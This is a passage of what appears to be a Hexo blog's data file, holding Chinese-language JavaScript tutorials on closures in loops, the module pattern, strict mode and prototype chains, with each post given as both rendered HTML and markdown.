class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> j = i;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log( j );</span><br><span class=\"line\">        &#125;, j*<span class=\"number\">1000</span>);</span><br><span class=\"line\">    &#125;)();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">j</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log( j );</span><br><span class=\"line\">        &#125;, j*<span class=\"number\">1000</span>);</span><br><span class=\"line\">    &#125;)(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// outupt ----&gt; 1 2 3 4 5</span></span><br><span class=\"line\"><span class=\"comment\">// 原因：IIFE 会为每个迭代都生成一个新的作用域，都有自己的变量，用 `j` 保存 `i` 的值</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> j = i; <span class=\"comment\">// 产生了新的块级作用域！</span></span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(j);</span><br><span class=\"line\">    &#125;, j*<span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">    &#125;, i*<span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// outupt ----&gt; 1 2 3 4 5</span></span><br><span class=\"line\"><span class=\"comment\">// 原因：变量 `i` 是 let 声明的，当前的i只在本轮循环有效，所以每一次循环的 `i` 其实都是一个新的变量, </span></span><br><span class=\"line\"><span class=\"comment\">//      JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量 `i` 时，就在上一轮循环的基础上进行计算</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// for 循环中 let 还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> i = <span class=\"string\">&#x27;abc&#x27;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ------ output ------</span></span><br><span class=\"line\"><span class=\"comment\">// abc</span></span><br><span class=\"line\"><span class=\"comment\">// abc</span></span><br><span class=\"line\"><span class=\"comment\">// abc</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"10、闭包与模块\"><a href=\"#10、闭包与模块\" class=\"headerlink\" title=\"10、闭包与模块\"></a>10、闭包与模块</h3><p>模块：返回的对象中含有对内部函数而不是内部数据变量的引用，保持内部数据变量是隐藏且私有的状态，并提供公共的API</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 模块模式</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> something = <span class=\"string\">&quot;cool&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> another = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doSomething</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(something);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doAnother</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(another.join( <span class=\"string\">&quot; ! &quot;</span> ));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        doSomething,</span><br><span class=\"line\">        doAnother</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>模块模式的两个必要条件：</p>\n<ol>\n<li>必须有外部的封闭函数，该函数必须至少被调用一次（每次调用都会创建一个新的模块实例）。</li>\n<li>封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并且可以访问或者修改私有的状态。</li>\n</ol>\n"},{"title":"严格模式","date":"2021-03-17T12:24:48.000Z","_content":"\n# 严格模式\n\n严格模式对正常的 JavaScript语义做了一些更改。\n\n1. 严格模式消除了一些 JavaScript 的静默错误，通过改变它们来抛出错误。\n2. 严格的模式修复了 JavaScript 引擎难以执行优化的错误，严格模式代码应该比非严格模式的相同的代码运行得更快。\n3. 严格模式禁用了在 ECMAScript 的未来版本中可能会定义的一些语法。\n\n### 1、严格模式下无法再意外创建全局变量\n\n```js\nname = 23; // 23\n\"use strict\";\nname = 23; // Uncaught ReferenceError: name is not defined\n```\n\n### 2、严格模式会使引起静默失败(不报错也没有任何效果)的赋值操抛出异常\n\n说明：在正常模式下, 给 NaN 赋值不会产生任何作用，开发者也不会受到任何错误反馈. 但在严格模式下, 给 NaN 赋值会抛出一个异常。任何在正常模式下引起静默失败的赋值操作 (给不可写属性赋值, 给只读属性(getter-only)赋值赋值, 给不可扩展对象(non-extensible object)的新属性赋值) 都会抛出异常\n\n```js\nNaN = 1; // 23\n\"use strict\";\nNaN = 1; // Uncaught TypeError: Cannot assign to read only property 'NaN' of object '#<Window>'\n```\n\n### 3、试图删除不可删除的属性时会抛出异常\n\n```js\ndelete Object.prototype; // false \n\"use strict\";\ndelete Object.prototype; // Uncaught TypeError: Cannot delete property 'prototype' of function Object() { [native code] }\n```\n\n### 4、严格模式下禁止 this 关键字指向全局对象（函数调用与构造函数中）\n\n### 5、严格模式禁用 with，否则会导致报错（便于编译器优化代码）\n\n### 6、严格模式下的 eval 不再为上层范围引入新变量\n\n### 7、严格模式禁止删除声明的变量\n\n### 8、严格模式禁止使用 `arguments.callee`\n\n### 9、严格模式下，参数的值不会随 arguments 对象的值的改变而变化\n\n```js\nfunction f(a){\n  \"use strict\";\n  a = 42;\n  return [a, arguments[0]];\n}\nvar pair = f(17);\nconsole.assert(pair[0] === 42);\nconsole.assert(pair[1] === 17); // arguments[0] 为传入的值且不再改变\n```","source":"_posts/JavaScript/严格模式.md","raw":"---\ntitle: 严格模式\ncategories: JavaScript\ntags: [JavaScript 基础]\ndate: 2021-03-17 20:24:48\n---\n\n# 严格模式\n\n严格模式对正常的 JavaScript语义做了一些更改。\n\n1. 严格模式消除了一些 JavaScript 的静默错误，通过改变它们来抛出错误。\n2. 严格的模式修复了 JavaScript 引擎难以执行优化的错误，严格模式代码应该比非严格模式的相同的代码运行得更快。\n3. 严格模式禁用了在 ECMAScript 的未来版本中可能会定义的一些语法。\n\n### 1、严格模式下无法再意外创建全局变量\n\n```js\nname = 23; // 23\n\"use strict\";\nname = 23; // Uncaught ReferenceError: name is not defined\n```\n\n### 2、严格模式会使引起静默失败(不报错也没有任何效果)的赋值操抛出异常\n\n说明：在正常模式下, 给 NaN 赋值不会产生任何作用，开发者也不会受到任何错误反馈. 但在严格模式下, 给 NaN 赋值会抛出一个异常。任何在正常模式下引起静默失败的赋值操作 (给不可写属性赋值, 给只读属性(getter-only)赋值赋值, 给不可扩展对象(non-extensible object)的新属性赋值) 都会抛出异常\n\n```js\nNaN = 1; // 23\n\"use strict\";\nNaN = 1; // Uncaught TypeError: Cannot assign to read only property 'NaN' of object '#<Window>'\n```\n\n### 3、试图删除不可删除的属性时会抛出异常\n\n```js\ndelete Object.prototype; // false \n\"use strict\";\ndelete Object.prototype; // Uncaught TypeError: Cannot delete property 'prototype' of function Object() { [native code] }\n```\n\n### 4、严格模式下禁止 this 关键字指向全局对象（函数调用与构造函数中）\n\n### 5、严格模式禁用 with，否则会导致报错（便于编译器优化代码）\n\n### 6、严格模式下的 eval 不再为上层范围引入新变量\n\n### 7、严格模式禁止删除声明的变量\n\n### 8、严格模式禁止使用 `arguments.callee`\n\n### 9、严格模式下，参数的值不会随 arguments 对象的值的改变而变化\n\n```js\nfunction f(a){\n  \"use strict\";\n  a = 42;\n  return [a, arguments[0]];\n}\nvar pair = f(17);\nconsole.assert(pair[0] === 42);\nconsole.assert(pair[1] === 17); // arguments[0] 为传入的值且不再改变\n```","slug":"JavaScript/严格模式","published":1,"updated":"2021-04-30T06:40:59.690Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cko3yr62m0001io6r4th40mli","content":"<h1 id=\"严格模式\"><a href=\"#严格模式\" class=\"headerlink\" title=\"严格模式\"></a>严格模式</h1><p>严格模式对正常的 JavaScript语义做了一些更改。</p>\n<ol>\n<li>严格模式消除了一些 JavaScript 的静默错误，通过改变它们来抛出错误。</li>\n<li>严格的模式修复了 JavaScript 引擎难以执行优化的错误，严格模式代码应该比非严格模式的相同的代码运行得更快。</li>\n<li>严格模式禁用了在 ECMAScript 的未来版本中可能会定义的一些语法。</li>\n</ol>\n<h3 id=\"1、严格模式下无法再意外创建全局变量\"><a href=\"#1、严格模式下无法再意外创建全局变量\" class=\"headerlink\" title=\"1、严格模式下无法再意外创建全局变量\"></a>1、严格模式下无法再意外创建全局变量</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name = <span class=\"number\">23</span>; <span class=\"comment\">// 23</span></span><br><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;</span><br><span class=\"line\">name = <span class=\"number\">23</span>; <span class=\"comment\">// Uncaught ReferenceError: name is not defined</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、严格模式会使引起静默失败-不报错也没有任何效果-的赋值操抛出异常\"><a href=\"#2、严格模式会使引起静默失败-不报错也没有任何效果-的赋值操抛出异常\" class=\"headerlink\" title=\"2、严格模式会使引起静默失败(不报错也没有任何效果)的赋值操抛出异常\"></a>2、严格模式会使引起静默失败(不报错也没有任何效果)的赋值操抛出异常</h3><p>说明：在正常模式下, 给 NaN 赋值不会产生任何作用，开发者也不会受到任何错误反馈. 但在严格模式下, 给 NaN 赋值会抛出一个异常。任何在正常模式下引起静默失败的赋值操作 (给不可写属性赋值, 给只读属性(getter-only)赋值赋值, 给不可扩展对象(non-extensible object)的新属性赋值) 都会抛出异常</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"literal\">NaN</span> = <span class=\"number\">1</span>; <span class=\"comment\">// 23</span></span><br><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;</span><br><span class=\"line\"><span class=\"literal\">NaN</span> = <span class=\"number\">1</span>; <span class=\"comment\">// Uncaught TypeError: Cannot assign to read only property &#x27;NaN&#x27; of object &#x27;#&lt;Window&gt;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、试图删除不可删除的属性时会抛出异常\"><a href=\"#3、试图删除不可删除的属性时会抛出异常\" class=\"headerlink\" title=\"3、试图删除不可删除的属性时会抛出异常\"></a>3、试图删除不可删除的属性时会抛出异常</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"built_in\">Object</span>.prototype; <span class=\"comment\">// false </span></span><br><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"built_in\">Object</span>.prototype; <span class=\"comment\">// Uncaught TypeError: Cannot delete property &#x27;prototype&#x27; of function Object() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4、严格模式下禁止-this-关键字指向全局对象（函数调用与构造函数中）\"><a href=\"#4、严格模式下禁止-this-关键字指向全局对象（函数调用与构造函数中）\" class=\"headerlink\" title=\"4、严格模式下禁止 this 关键字指向全局对象（函数调用与构造函数中）\"></a>4、严格模式下禁止 this 关键字指向全局对象（函数调用与构造函数中）</h3><h3 id=\"5、严格模式禁用-with，否则会导致报错（便于编译器优化代码）\"><a href=\"#5、严格模式禁用-with，否则会导致报错（便于编译器优化代码）\" class=\"headerlink\" title=\"5、严格模式禁用 with，否则会导致报错（便于编译器优化代码）\"></a>5、严格模式禁用 with，否则会导致报错（便于编译器优化代码）</h3><h3 id=\"6、严格模式下的-eval-不再为上层范围引入新变量\"><a href=\"#6、严格模式下的-eval-不再为上层范围引入新变量\" class=\"headerlink\" title=\"6、严格模式下的 eval 不再为上层范围引入新变量\"></a>6、严格模式下的 eval 不再为上层范围引入新变量</h3><h3 id=\"7、严格模式禁止删除声明的变量\"><a href=\"#7、严格模式禁止删除声明的变量\" class=\"headerlink\" title=\"7、严格模式禁止删除声明的变量\"></a>7、严格模式禁止删除声明的变量</h3><h3 id=\"8、严格模式禁止使用-arguments-callee\"><a href=\"#8、严格模式禁止使用-arguments-callee\" class=\"headerlink\" title=\"8、严格模式禁止使用 arguments.callee\"></a>8、严格模式禁止使用 <code>arguments.callee</code></h3><h3 id=\"9、严格模式下，参数的值不会随-arguments-对象的值的改变而变化\"><a href=\"#9、严格模式下，参数的值不会随-arguments-对象的值的改变而变化\" class=\"headerlink\" title=\"9、严格模式下，参数的值不会随 arguments 对象的值的改变而变化\"></a>9、严格模式下，参数的值不会随 arguments 对象的值的改变而变化</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">a</span>)</span>&#123;</span><br><span class=\"line\"><span class=\"meta\">  &quot;use strict&quot;</span>;</span><br><span class=\"line\">  a = <span class=\"number\">42</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> [a, <span class=\"built_in\">arguments</span>[<span class=\"number\">0</span>]];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> pair = f(<span class=\"number\">17</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.assert(pair[<span class=\"number\">0</span>] === <span class=\"number\">42</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.assert(pair[<span class=\"number\">1</span>] === <span class=\"number\">17</span>); <span class=\"comment\">// arguments[0] 为传入的值且不再改变</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"严格模式\"><a href=\"#严格模式\" class=\"headerlink\" title=\"严格模式\"></a>严格模式</h1><p>严格模式对正常的 JavaScript语义做了一些更改。</p>\n<ol>\n<li>严格模式消除了一些 JavaScript 的静默错误，通过改变它们来抛出错误。</li>\n<li>严格的模式修复了 JavaScript 引擎难以执行优化的错误，严格模式代码应该比非严格模式的相同的代码运行得更快。</li>\n<li>严格模式禁用了在 ECMAScript 的未来版本中可能会定义的一些语法。</li>\n</ol>\n<h3 id=\"1、严格模式下无法再意外创建全局变量\"><a href=\"#1、严格模式下无法再意外创建全局变量\" class=\"headerlink\" title=\"1、严格模式下无法再意外创建全局变量\"></a>1、严格模式下无法再意外创建全局变量</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name = <span class=\"number\">23</span>; <span class=\"comment\">// 23</span></span><br><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;</span><br><span class=\"line\">name = <span class=\"number\">23</span>; <span class=\"comment\">// Uncaught ReferenceError: name is not defined</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、严格模式会使引起静默失败-不报错也没有任何效果-的赋值操抛出异常\"><a href=\"#2、严格模式会使引起静默失败-不报错也没有任何效果-的赋值操抛出异常\" class=\"headerlink\" title=\"2、严格模式会使引起静默失败(不报错也没有任何效果)的赋值操抛出异常\"></a>2、严格模式会使引起静默失败(不报错也没有任何效果)的赋值操抛出异常</h3><p>说明：在正常模式下, 给 NaN 赋值不会产生任何作用，开发者也不会受到任何错误反馈. 但在严格模式下, 给 NaN 赋值会抛出一个异常。任何在正常模式下引起静默失败的赋值操作 (给不可写属性赋值, 给只读属性(getter-only)赋值赋值, 给不可扩展对象(non-extensible object)的新属性赋值) 都会抛出异常</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"literal\">NaN</span> = <span class=\"number\">1</span>; <span class=\"comment\">// 23</span></span><br><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;</span><br><span class=\"line\"><span class=\"literal\">NaN</span> = <span class=\"number\">1</span>; <span class=\"comment\">// Uncaught TypeError: Cannot assign to read only property &#x27;NaN&#x27; of object &#x27;#&lt;Window&gt;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、试图删除不可删除的属性时会抛出异常\"><a href=\"#3、试图删除不可删除的属性时会抛出异常\" class=\"headerlink\" title=\"3、试图删除不可删除的属性时会抛出异常\"></a>3、试图删除不可删除的属性时会抛出异常</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"built_in\">Object</span>.prototype; <span class=\"comment\">// false </span></span><br><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"built_in\">Object</span>.prototype; <span class=\"comment\">// Uncaught TypeError: Cannot delete property &#x27;prototype&#x27; of function Object() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4、严格模式下禁止-this-关键字指向全局对象（函数调用与构造函数中）\"><a href=\"#4、严格模式下禁止-this-关键字指向全局对象（函数调用与构造函数中）\" class=\"headerlink\" title=\"4、严格模式下禁止 this 关键字指向全局对象（函数调用与构造函数中）\"></a>4、严格模式下禁止 this 关键字指向全局对象（函数调用与构造函数中）</h3><h3 id=\"5、严格模式禁用-with，否则会导致报错（便于编译器优化代码）\"><a href=\"#5、严格模式禁用-with，否则会导致报错（便于编译器优化代码）\" class=\"headerlink\" title=\"5、严格模式禁用 with，否则会导致报错（便于编译器优化代码）\"></a>5、严格模式禁用 with，否则会导致报错（便于编译器优化代码）</h3><h3 id=\"6、严格模式下的-eval-不再为上层范围引入新变量\"><a href=\"#6、严格模式下的-eval-不再为上层范围引入新变量\" class=\"headerlink\" title=\"6、严格模式下的 eval 不再为上层范围引入新变量\"></a>6、严格模式下的 eval 不再为上层范围引入新变量</h3><h3 id=\"7、严格模式禁止删除声明的变量\"><a href=\"#7、严格模式禁止删除声明的变量\" class=\"headerlink\" title=\"7、严格模式禁止删除声明的变量\"></a>7、严格模式禁止删除声明的变量</h3><h3 id=\"8、严格模式禁止使用-arguments-callee\"><a href=\"#8、严格模式禁止使用-arguments-callee\" class=\"headerlink\" title=\"8、严格模式禁止使用 arguments.callee\"></a>8、严格模式禁止使用 <code>arguments.callee</code></h3><h3 id=\"9、严格模式下，参数的值不会随-arguments-对象的值的改变而变化\"><a href=\"#9、严格模式下，参数的值不会随-arguments-对象的值的改变而变化\" class=\"headerlink\" title=\"9、严格模式下，参数的值不会随 arguments 对象的值的改变而变化\"></a>9、严格模式下，参数的值不会随 arguments 对象的值的改变而变化</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">a</span>)</span>&#123;</span><br><span class=\"line\"><span class=\"meta\">  &quot;use strict&quot;</span>;</span><br><span class=\"line\">  a = <span class=\"number\">42</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> [a, <span class=\"built_in\">arguments</span>[<span class=\"number\">0</span>]];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> pair = f(<span class=\"number\">17</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.assert(pair[<span class=\"number\">0</span>] === <span class=\"number\">42</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.assert(pair[<span class=\"number\">1</span>] === <span class=\"number\">17</span>); <span class=\"comment\">// arguments[0] 为传入的值且不再改变</span></span><br></pre></td></tr></table></figure>"},{"title":"原型链与继承","date":"2021-04-27T12:24:48.000Z","_content":"\n# 原型链与继承\n\n### 1、原型链\n\n在面向类的语言中，类可以被复制（或实例化）多次，实例化（或者继承）一个类就意味着“把类的 行为复制到物理对象中”，对于每一个新实例来说都会重复这个过程。\n\n在 JavaScript 中，并没有类似的复制机制。Javascript 中不能创建一个类的多个实例，只能创建多个对象，它们的 `[[Prototype]]` 关联的是同一个对象，这样一个对象就可以通过委托访问另一个对象的属性和函数。\n\nJavaScript 中父类和子类的关系只存在于两者构造函数对应的 `.prototype` 对象中，它们的构造函数之间并不存在直接联系\n\nJavaScript 中的函数无法真正地复制，只能复制对共享函数对象的引用，JavaScript 对象有一个特殊的 `[[Prototype]]` 内置属性，其实就是对于其他对象的引用。几乎所有的对象在创建时 `[[Prototype]]` 属性都会被赋予一个非空的值。\n\n函数本身并不是构造函数，然而，当在普通的函数调用前面加上 `new` 关键字之后，就会把这个函数调用变成一个“构造函数 调用”。实际上， `new` 会劫持所有普通函数并用构造对象的形式来调用它。在 JavaScript 中对于“构造函数”最准确的解释是，所有带 `new` 的函数调用。\n\n`new Foo()` 这个函数调用实际上并没有直接创建关联，这个关联只是一个意外的副作用（新创建的对象添加了 `__proto__` 属性）， `new Foo()` 只是间接完成了目标：一个关联到其他对象的新对象。更直接的方式是使用 `Object.create(...)`。\n\nJavaScript 的 `[[Prototype]]` 机制本质上就是行为委托机制：`[[Prototype]]` 存在于对象中的一个内部链接，它会引用其他对象。通常来说，这个链接的作用是：如果在对象上没有找到需要的属性或者方法引用，引擎就会继续在 `[[Prototype]]` 关联的对象上进行查找。同理，如果在后者中也没有找到需要的引用就会继续查找它的 `[[Prototype]`] ，以此类推。这一系列对象的链接被称为“原型链”。\n\n```js\nfunction Foo(name) {\n    this.name = name;\n}\nFoo.prototype.myName = function() {\n    return this.name;\n};\nvar a = new Foo( \"a\" );\nvar b = new Foo( \"b\" );\na.myName(); // \"a\"\nb.myName(); // \"b\"\na.constructor === Foo // true\n\n// 看起来创建 `a` 和 `b` 时会把 `Foo.prototype` 对象复制到这两个对象中，然而事实并不是这样，\n// 在创建的过程中， `a` 和 `b` 的内部 [[Prototype]] 都会关联到 `Foo.prototype` 上。\n// 当 `a` 和 `b` 中无法找到 `myName` 时，它会在 `Foo.prototype` 上找到。\n\n// 看起来 `a.constructor === Foo` 为真意味着 `a` 确实有一个指向 `Foo` 的 `.constructor` 属性，\n// 但是事实不是这样，实际上， `.constructor` 引用同样被委托给了 `Foo.prototype` ，而`Foo.prototype.constructor` 默认指向 `Foo`\n```\n\n### 2、属性遍历\n\n使用 `for...in` 遍历对象时原理和查找 `[[Prototype]]` 链类似，任何可以通过原型链访问到且 `enumerable: true` 的属性都会被枚举。使用 `in` 操作符检查属性在对象中是否存在时，也会查找对象的整条原型链（无论属性是否可枚举）\n\n```js\nvar obj = {\n    name: 'xxb'\n};\n\nObject.defineProperty(obj, 'age', {\n    age: 24,\n    enumerable: false\n})\n\nfor (let key in obj) {\n    console.log(key);\n}\n\nconsole.log('age' in obj);\nconsole.log('toString' in obj);\n```\n\n### 3、属性设置与屏蔽\n\n在于原型链上层时 obj.foo = \"bar\" 会出现的三种情况。\n1. 如果在 [[Prototype]] 链上层存在名为 foo 的普通数据访问属性并且 writable: true ，那就会直接在 obj 中添加一个名为 foo 的新属性，它是屏蔽属性。\n2. 如果在 [[Prototype]] 链上层存在 foo ，但 writable:false，那么无法修改已有属性或者在 obj 上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。总之，不会发生屏蔽。\n3. 如果在 [[Prototype]] 链上层存在 foo 并且它是一个 setter，那就一定会调用这个 setter。 foo 不会被添加到obj ，也不会重新定义 foo 这个 setter。\n   \n> [[Prototype]] 链上层的只读属性会阻止 [[Prototype]] 链下层隐式创建（屏蔽）同名属性。这样做主要是为了模拟类属性的继承，比如父类的属性只读级别，则子类的属性应该不高于只读级别。\n\n> 解决第2、3种情况可使用 Object.defineProperty() , 而不是使用 = 赋值\n\n```js\n// 情形1 生成屏蔽属性\nvar parent = {\n    name: 'aaaa'\n};\n\nvar son = Object.create(parent);\nson.name = 'bbbb';\n\nconsole.log(son.name);\n```\n\n```js\n// 情形2 赋值时报错\nvar parent = {};\nObject.defineProperty(parent, 'name', {\n    value: 'aaa',\n    writable: false\n})\n\nvar son = Object.create(parent);\nson.name = 'bbbb';  // TypeError: Cannot assign to read only property 'name' of object '#<Object>'\n```\n\n```js\n// 情形3 赋值失败并执行 `set()`\nvar parent = {};\nObject.defineProperty(parent, 'name', {\n    set () {\n        console.log('set');\n    }\n})\n\nvar son = Object.create(parent);\nson.name = 'bbbb';  \n\nconsole.log(son.name);\n\n// ----- output -----\n// set\n// undefined\n```\n### 4、__proto__ 属性\n\n浏览器支持一种非标准的方法来访问内部 `[[Prototype]]` 属性， `.__proto__` 的实现大致如下：\n\n```js\nObject.defineProperty(Object.prototype, 